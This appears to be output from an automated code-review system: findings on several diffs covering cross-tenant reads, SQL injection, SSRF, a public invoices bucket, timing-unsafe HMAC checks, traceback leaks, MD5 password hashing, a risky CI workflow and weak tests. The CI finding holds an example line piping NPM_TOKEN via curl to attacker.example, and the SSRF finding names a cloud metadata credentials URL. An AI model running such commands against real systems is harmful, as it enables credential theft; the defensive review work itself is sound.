findings.title: Ownership check removed from bulk_export enables cross-tenant reads
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report; the diff deletes that loop and the `require_owner` import. Now any authenticated caller can pass arbitrary `report_ids` and receive `r.to_dict()` for reports belonging to other tenants.

Adversary: any authenticated user (a valid tenant account is the only prerequisite). What they control: the `report_ids` list, which is passed straight to `Report.get(rid)` with no filter on `user.tenant_id`. What they get: full serialized contents of any report whose id they can guess or enumerate — ids are typically sequential or otherwise guessable, and even random ids leak via any surface that exposes them.

Authentication (`current_user`) is not authorisation: it establishes who is calling, not that they may read *these* objects. Restore the check, or better, make the fetch itself tenant-scoped so the authorisation cannot be bypassed by a future caller either, e.g. `reports = Report.where(id__in=report_ids, tenant_id=user.tenant_id)` and reject/404 when the returned count differs from the requested count. If the loop was removed for performance, the batched tenant-scoped query solves the N-queries problem without dropping the control.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-object ownership

findings.title: Missing authorization contract on bulk_export
findings.body: The `bulk_export` function has been modified to remove per-object ownership validation, but there is no docstring documenting the authorization requirements or guarantees. A caller looking at this function cannot determine whether it is safe to pass arbitrary report IDs, or whether the API has delegated authorization elsewhere. The PR description says 'callers are already authenticated' but this contract is not documented for future maintainers or users of the function.

findings.title: No test guards bulk_export's cross-tenant access removal
findings.body: The per-object require_owner(user, report) check was removed from bulk_export, but no test file is part of this change. If bulk_export previously had a test asserting Forbidden is raised for a report belonging to another tenant, that test would now need to fail — but since no test changes are shown, it's unclear whether such a test exists or was updated/removed alongside this change. If no test exercises cross-tenant access to bulk_export, this regression would ship silently with nothing catching it.

findings.title: search_customers interpolates input instead of parameterising
findings.body:
`sql` is assembled with an f-string that splices `term` and `status` directly into quoted SQL literals, and `execute(sql)` is then called without a `params` argument. `billing/db.py` documents `execute(sql, params=None)` as "Run a parameterised query. `params` must carry every caller value." — this call violates that contract, unlike the adjacent `get_customer`, which correctly passes `("... id = %s", (customer_id,))`.

Beyond the injection exposure, this is also wrong for benign input: a customer name such as `O'Brien` terminates the string literal and raises a syntax error from the driver, and a `term` containing `%` or `_` silently changes the LIKE semantics.

Rewrite as:

    return execute(
        "SELECT * FROM customers WHERE name LIKE %s AND status = %s",
        (f"%{term}%", status),
    )

so the wildcards live in the bound value and every caller value travels through `params`.

_Also raised by the security agent:_ SQL injection via f-string interpolation in search_customers

findings.title: Public API lacks contract documentation and violates established pattern
findings.body: The `search_customers` function is a new public API without a docstring explaining its contract. More critically, it violates the documented contract of `execute()` from billing/db.py, which states "params must carry every caller value." This function instead builds SQL via f-string interpolation (line 9), passing an un-parameterised query to `execute()`. A caller reading the db.py docstring would reasonably expect parameterised queries and could be misled about safety. The function needs a docstring that clarifies how its parameters are used, or the implementation must be corrected to match the established pattern.

findings.title: No test coverage for new search_customers query construction
findings.body: search_customers builds SQL by interpolating term and status directly into the string and calls execute(sql) without params, unlike get_customer's parameterised pattern. There is no test in this diff exercising this function, so a change to correct it to use parameters (or a regression reintroducing the interpolation bug) would not be caught by any test. Given the existing db.execute helper explicitly documents that params must carry every caller value, a test asserting the query is built with parameters (not interpolated values) would catch this class of defect.

findings.title: verify_endpoint bypasses ALLOWED_HOSTS, allowing tenant-driven SSRF
findings.body:
`verify_endpoint(url)` issues `requests.get(url)` with no host validation, while the delivery path immediately above it parses the host and rejects anything not in `ALLOWED_HOSTS` (lines 8-9). Per the PR description the URL originates from a tenant registering a webhook target, so a customer can point verification at internal-only destinations — cloud metadata (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), `http://localhost:*` admin ports, or internal service hostnames — and the returned `status_code` acts as an oracle for probing the internal network.

Apply the same validation used by the delivery function before the request, and factor it into a shared helper so future call sites cannot skip it. Two related hardening steps while you are in here: pass `allow_redirects=False` (the existing checked path is also bypassable by an allowed host that 302s to an internal address), and block link-local/loopback/RFC1918 resolution rather than relying on hostname matching alone.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check the sender enforces
findings.body: The existing send path parses the host and rejects anything outside `ALLOWED_HOSTS` before issuing the request (lines 8-10). `verify_endpoint` takes the same tenant-supplied `url` and issues a GET with no such check, so a URL that the sender would refuse is still fetched by the verifier. Since `requests.get` also follows redirects by default, even an allowlisted host can hand back a 30x to an arbitrary destination. Route both functions through the same validation helper, and pass `allow_redirects=False` (or re-validate each hop) so the check cannot be sidestepped.

findings.title: New verify_endpoint function has no test coverage
findings.body: verify_endpoint is a new public function that makes an outbound GET request and returns a status code, but no test exercises it (e.g. mocking requests.get and asserting the returned status, or checking behavior on non-2xx/timeout). Since it lacks the ALLOWED_HOSTS check present in the sibling function, a test would also help pin down intended behavior around host validation. As written, nothing in the diff would fail if this function's logic were wrong.

findings.title: Customer invoices bucket has all public-access protections disabled
findings.body:
`aws_s3_bucket.invoices` (`acme-customer-invoices`) is paired with an `aws_s3_bucket_public_access_block` that sets all four guards to `false`. This is an exact copy of the block written for the marketing *assets* bucket, where public exposure is intentional. For invoice data it means any ACL or bucket policy that grants public read — set now, or by a later change, or accidentally by an object-level ACL — will take effect with nothing to stop it.

Either drop the `invoices` public access block entirely (the AWS default of all-true blocking applies, and is what you want here), or set all four attributes to `true` explicitly. If the invoices bucket is not part of "add the public assets bucket", it should be removed from this PR.

_Also raised by the security agent:_ Customer invoices bucket created with all public access blocks disabled

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same kind of HMAC digest as `verify_stripe` but validates it with `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the signature an attacker guessed correctly, allowing a forged signature to be recovered byte-by-byte over repeated requests. The function two lines above (line 7) already does this correctly. Change line 12 to `return hmac.compare_digest(expected, header)`.

Secondary note while you are there: `compare_digest` raises `TypeError` if `header` is `None` or a `bytes`/`str` mismatch, whereas `==` silently returns `False`; if callers can pass a missing header, normalise it (e.g. `header or ""`) so the failure mode stays a clean `False`.

_Also raised by the security agent:_ verify_acmepay compares HMAC with `==` instead of compare_digest

findings.title: No test exercises verify_acmepay
findings.body: verify_acmepay is new behavior (webhook signature verification for a second provider) but no test file is included in this diff. If the comparison logic were wrong (e.g. accepting mismatched signatures), nothing would fail. Add a test asserting correct signatures verify and incorrect ones do not.

findings.title: Exception text and full traceback returned to the client on 500
findings.body:
`handle(exc)` previously returned a fixed `"internal error"` body; it now serialises `str(exc)` and `traceback.format_exc()` into the HTTP response. Any client that can provoke an unhandled exception — typically by sending malformed parameters, oversized values, or an unexpected content type — receives the stack frames, absolute source paths, module/dependency names and versions, the failing source lines, and whatever the exception message happens to embed. Database and driver exceptions are the worst case here: DB-API and ORM errors routinely include the failing SQL, table and column names, and connection parameters (host, port, user), and some driver errors echo the DSN itself.

That output is reconnaissance an unauthenticated attacker would otherwise have to guess at: it maps the internal file layout, reveals which libraries and versions are deployed (directly usable for picking a known CVE), and discloses schema details that make subsequent injection or IDOR attempts far cheaper.

Keep the client-facing body opaque and put the detail where on-call can already reach it. The `log.exception("request failed")` on line 8 is already emitting the full traceback to the logging backend, so the operational goal is met without the response change. If correlating a user report to a log line is the real need, return a generated identifier instead:

```python
def handle(exc):
    incident_id = uuid.uuid4().hex
    log.exception("request failed", extra={"incident_id": incident_id})
    return {"error": "internal error", "incident_id": incident_id}, 500
```

If verbose bodies are genuinely wanted for local work, gate them behind an explicit non-production setting that defaults to off, rather than returning them unconditionally.

_Also raised by the correctness agent:_ traceback.format_exc() yields "NoneType: None" outside an except block

_Also raised by the correctness agent:_ 500 response body shape changed: stable "error" string replaced, new key added

findings.title: No test covers the new error response contents
findings.body: The handle() function's return value changed from a generic error message to including str(exc) and a full traceback. There is no test in this diff verifying the response shape, and no existing test file was included to confirm this is already covered elsewhere. If this behavior is wrong (e.g. it should not leak internals), nothing would fail to signal that.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password digest with a single unsalted MD5 pass, while `hash_password` immediately above uses bcrypt with a generated salt. MD5 is fast and unsalted here, so any stored value is recoverable by offline dictionary/rainbow-table attack at commodity GPU rates, and identical passwords produce identical digests across users.

Adversary: anyone who obtains read access to the stored digests — via SQL injection, a leaked backup or snapshot, a log sink, or an insider. What they control: nothing; possession of the table is enough. What they get: the users' plaintext passwords, which are typically reused on other services, plus the ability to complete the reset flow itself.

Fix: use the same primitive as the existing function — `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` (or argon2/scrypt) — and verify with `bcrypt.checkpw` so the comparison is also constant-time. If this value is actually a reset *token* rather than a password, it should be a `secrets.token_urlsafe` value hashed with SHA-256 and compared with `hmac.compare_digest`, not MD5 of a user-supplied string.

findings.title: Reset path emits MD5 digest incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt string (`$2b$...`), but `hash_reset_password` returns a 32-char MD5 hex digest. If both write to the same stored-password column, whatever verifies logins (presumably `bcrypt.checkpw`) will reject or raise on the MD5 value, so a user who completes a password reset cannot log in. Either route the reset flow through `hash_password` (bcrypt) so the stored format stays uniform, or, if a separate verification branch genuinely exists, make that explicit — and note that an unsalted MD5 is not an acceptable password hash regardless. No verification code was retrieved, so please confirm the caller side.

findings.title: New hashing/checksum functions have no tests
findings.body: hash_reset_password and checksum are new public functions with no accompanying tests in this diff. Nothing verifies their output format, error handling (e.g. missing file for checksum), or that hash_reset_password produces a stable, verifiable digest. If the implementation were changed or broken, no test would fail.

findings.title: pull_request_target runs untrusted fork code with NPM_TOKEN in env
findings.body:
`pull_request_target` runs the workflow in the context of the **base** repository: it has access to `secrets` and a `GITHUB_TOKEN` with write scope, and it is triggered automatically by anyone who opens a pull request from a fork. The checkout on lines 10-12 then deliberately pins `ref: ${{ github.event.pull_request.head.sha }}`, i.e. the attacker's commit, and line 13 executes `./scripts/measure.sh` **from that checkout** with `NPM_TOKEN` injected on lines 14-15.

Attacker: any GitHub user, no prior access required. What they control: the full contents of `scripts/measure.sh` (and anything it sources, plus package manifests/lifecycle scripts it may invoke) in their fork branch. What they get: arbitrary command execution in the base-repo job, so `echo $NPM_TOKEN | curl attacker.example -d @-` exfiltrates the publish token, and the ambient `GITHUB_TOKEN` can be used to push to the base repo or tamper with checks — all before a maintainer reviews anything.

Fixes, in order of preference:
1. Revert to `pull_request`. Forked PRs already run under that trigger with a read-only token and no secrets, which is precisely the isolation you want here; external contributors still get the CI signal, just without the token.
2. If the size check genuinely needs a registry credential, split it: a `pull_request` job that builds/measures untrusted code with no secrets, and a separate privileged job (`workflow_run` or `pull_request_target` checking out only the **base** ref) that consumes the artifact and never executes fork-controlled files.

Whichever way you go, do not combine `pull_request_target` + checkout of `head.sha` + execution of code from that checkout. Additionally, add an explicit `permissions:` block scoping `GITHUB_TOKEN` to the minimum (`contents: read`), since `pull_request_target` otherwise grants write access to the base repository.

_Also raised by the correctness agent:_ pull_request_target + head.sha checkout runs fork code with NPM_TOKEN

findings.title: json.dumps raises for contexts the old tuple key accepted
findings.body: The previous key `(template_source, tuple(sorted(context.items())))` only required context keys to be sortable and values to be hashable. `json.dumps` additionally requires every value to be JSON-encodable, so any existing caller passing a `datetime`, `Decimal`, `set`, tuple-keyed mapping, or a plain custom object in the context now gets a `TypeError` from the cache layer before `_render` is ever reached — a rendering call that used to succeed now fails outright. If arbitrary context objects are supported, pass `default=repr` (or a stable fallback) to `json.dumps`, or fall back to the old tuple key when serialisation fails.

findings.title: No test covers context values/keys that don't round-trip through JSON the same as Python equality
findings.body: The cache key generation changed from `tuple(sorted(context.items()))` (works for any hashable context) to `json.dumps([template_source, context], sort_keys=True)`. JSON serialization normalizes types in ways Python equality does not: non-string dict keys are coerced to strings (so context `{1: 'x'}` and `{'1': 'x'}` would collide and share a cache entry), and non-JSON-serializable values (tuples, sets, custom objects) will raise instead of caching. None of the new tests exercise these cases, so a regression here (e.g. accidental cache collisions between differently-typed keys) would pass silently.

findings.title: New name allowlist rejects inputs create_archive previously accepted
findings.body:
`create_archive` previously accepted any `name` and interpolated it into the command. It now raises `ValueError` unless the name matches `[A-Za-z0-9_-]{1,64}` in full. That excludes several shapes that are very ordinary for archive names and that the old code handled fine: dots (`backup.2024-01-01`, `db.dump`), spaces, subdirectory components (`tenants/acme`), and any name longer than 64 characters. Any existing caller passing such a name changes from a successful archive to an uncaught exception — a runtime break rather than a hardening no-op.

If `.` is legitimate for your callers, add it to the class while still excluding `/` and `..` (e.g. reject a name equal to `.`/`..` explicitly), and confirm the 64-character ceiling against the longest name actually produced today. If not, this at least needs a note in the changelog since it is a caller-visible contract narrowing.

findings.title: `directory` is unvalidated and controls what tar reads
findings.body:
`name` is now tightly allowlisted, but `directory` flows straight into the tar argv with no checks. Shell injection is correctly closed off (list argv, `shell=False`) and `--` stops it being read as an option, so the remaining exposure is content: whatever path is passed becomes the contents of `/exports/<name>.tar.gz`. If any caller lets a user influence `directory` — an export API taking a path or a project slug joined onto a root — that user gets `/etc`, `/root/.ssh`, or the app's config directory packaged into a file they can then download, i.e. arbitrary file read.

Suggested fix: resolve `directory` (`os.path.realpath`) and assert it is inside an expected export root before invoking tar, in the same place `name` is checked.

findings.title: test_runs_without_a_shell relies on an undefined `spy` fixture
findings.body:
`test_runs_without_a_shell` takes a `spy` fixture that is not defined anywhere in this diff and no `conftest.py` is added. If that fixture does not exist, the test errors at collection; if it exists but does not patch `subprocess.run`, the test actually forks `tar` and writes to `/exports/nightly.tar.gz`, which will fail on any machine where `/exports` is absent and makes the test non-hermetic.

Separately, the assertion reads `kwargs["shell"]`, which only holds because the call passes `shell=False` explicitly even though it is the default. Dropping that redundant kwarg later would turn this into a `KeyError` rather than a meaningful failure. Asserting on `args[0]` being a list (or that the first positional arg is a sequence, not a string) tests the actual property you care about and survives that refactor.

_Also raised by the tests agent:_ Test only checks mocked shell kwarg, not actual argv contents

findings.title: No test verifies the argv list content, including the `--` separator
findings.body: The change introduces list-form argv construction with a `--` separator specifically to stop a directory value from being interpreted as a tar option (e.g. a directory beginning with `-`). Neither test in test_archive.py verifies the actual contents of the argv list or exercises a directory value that would exploit missing `--` protection, so a regression that drops the `--` or misorders the args would go undetected.

findings.title: test_renders_empty_invoice contains no assertion
findings.body:
The test calls `render(Invoice(lines=[]))` and then ends. It passes for any return value — `None`, an empty string, a stack of garbage — and only fails if `render` raises. If the blank-invoice case is worth a test, assert the expected output (e.g. that the result is a string containing the header/zero total), otherwise the test gives false confidence that the empty path is covered. Compare with `test_renders_total` on line 2, which does assert on the returned value.

findings.title: test_renders_line_items asserts only mock call_count, not actual output
findings.body:
The test mocks out format_line and only checks that it was called twice; it never checks what render() actually returns. If render() dropped the formatted lines, joined them incorrectly, or produced garbled output, this test would still pass as long as format_line got called twice. Assert on the actual rendered string content instead.

findings.title: Failing test deleted with no accompanying rounding fix in the diff
findings.body:
The PR is described as "Fix the rounding and drop the failing test", but the diff contains only the deletion of `test_rounds_half_to_even`; no production code is changed here. Either the implementation fix was omitted from this change (in which case the behaviour at the exact .5 boundary is still wrong and now silently so), or the behaviour intentionally changed and the test should have been *updated* to assert the new expected value rather than removed. Deleting it leaves `round_cents` with no coverage at all for the half-way boundary — the single case where rounding implementations differ — so a future regression between half-to-even and half-up will go undetected. Please either include the implementation change in this PR or restore the test with the corrected expectation (e.g. `round_cents(Decimal("2.345")) == Decimal("2.35")` if half-up is now intended).

_Also raised by the tests agent:_ Half-to-even rounding case deleted without replacement test

findings.title: Retry test patches wrong target; real `deliver` is invoked
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so the name `deliver` is bound into the `notify.sender` namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only; `send_with_retry` continues to call the original function object it captured. This test therefore exercises the real transport three times (possible network I/O, slowness, or flakiness) and only asserts `False` because the real `deliver` happened to return a falsy value — it would not catch a regression in the retry/give-up logic, and it would not catch a change from `attempts=3` to any other loop behaviour.

Patch the same target the passing test on line 2 already uses: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the call count equals 3 so the test actually pins the retry contract.

_Also raised by the tests agent:_ Mock patches wrong target; retry-exhaustion path is untested

findings.title: Test patch contradicts documented behavior
findings.body: The test patches `notify.transport.deliver`, but the docstring in `notify/sender.py` explicitly documents that `deliver` is bound into the module namespace at import time, making it necessary to patch `notify.sender.deliver` instead. This test will not exercise the retry path as intended because the patch does not affect the actual function call. The docstring is the contract that explains the correct patching strategy; this test contradicts it.

findings.title: csv_rows does not apply csv_escape, producing malformed CSV
findings.body: `csv_rows` stringifies each cell and joins with `,` without ever calling `csv_escape`, which is defined immediately below for exactly this purpose. Any cell whose value contains a comma or a double quote (e.g. `{"a": "Smith, John"}`) emits an extra field and shifts every subsequent column for that row, so the output no longer round-trips through any CSV reader. Change the comprehension to `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: csv_rows joins raw values without using csv_escape
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never calls the `csv_escape` helper defined immediately below it. Any field value that contains a comma, a double quote, or a newline will be emitted unquoted, so the consumer of the CSV sees extra columns (or an extra record, for an embedded newline) that the producer never intended. If any part of `rows` originates from user-supplied report data — a name, a note, a URL — the supplier of that value controls the column layout of the output file and can forge values into adjacent columns of downstream imports.

Fix: apply the escaper in the join, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. While there, note that `csv_escape` also does not handle embedded newlines (a value with `\n` but no comma or quote is returned as-is and will split the record), and does not neutralise a leading `=`, `+`, `-` or `@`, which spreadsheet applications interpret as a formula. Using the stdlib `csv` module would cover the quoting cases correctly.

findings.title: csv_escape assumes str and ignores embedded newlines
findings.body: `csv_escape` calls `in` and `.replace` directly on `value`, so a non-string cell (int, None, date) raises `TypeError: argument of type 'int' is not iterable` rather than being escaped — relevant as soon as it is wired into `csv_rows`, whose cells come from arbitrary dicts. It also only tests for `,` and `"`; a value containing `\n` or `\r` must also be quoted or it splits the record across lines. Coerce with `value = str(value)` first and extend the condition to newline characters.

findings.title: New CSV helpers lack tests (and 2 more)

csv_rows and csv_escape are new public functions with non-trivial logic (column ordering, quote escaping) but no test covers them; the repo does have a precedent test for csv_header, so this is a real gap against the existing coverage standard.

findings.title: New test uses wall-clock time instead of a fixed now, weak assertion
findings.body:
Unlike test_token_expires_after_an_hour, which pins 'now' via an explicit timedelta so the expiry boundary is exercised deterministically, test_token_issued_today_is_valid calls is_expired(token.expires_at) with no now argument and compares issued_at.date() to datetime.now(timezone.utc).date(). This makes the test dependent on the real clock: it can flake around midnight UTC (issued_at computed just before midnight, comparison evaluated just after), and it never actually approaches the expiry boundary the PR claims to test — it will pass even if the expiry-window arithmetic is subtly wrong (e.g. off-by-one in the window calculation), since 'issued now' is far from any edge case.

_Also raised by the correctness agent:_ Test is time-dependent and will fail across the UTC midnight boundary

findings.title: No test covers coupon expiry rejection
findings.body:
apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, i.e. the happy path. There is no test asserting that an expired coupon raises CouponExpired. If the comparison logic were inverted, or the exception were never raised, no test would fail.

findings.title: apply_coupon now requires a tz-aware coupon.expires_at on every caller
findings.body:
Line 9 unconditionally dereferences `coupon.expires_at` and compares it to an aware UTC datetime. Three reachable inputs fail badly rather than behaving as intended:

- A coupon object without the attribute (any caller or fixture predating this change) raises `AttributeError`, not `CouponExpired`.
- `expires_at is None` (a coupon that never expires is the natural encoding) raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'`.
- A naive `expires_at` (e.g. loaded from a DB column without timezone) raises `TypeError: can't compare offset-naive and offset-aware datetimes`.

The test edit on tests/test_coupons.py line 3 is direct evidence that `Coupon` was previously constructed without `expires_at`, so callers that still do exist. Guard the check, e.g. `if coupon.expires_at is not None and coupon.expires_at < now`, and normalise naive values to UTC before comparing — or make `expires_at` a required, always-aware field at the `Coupon` construction site so the failure is not deferred into billing.
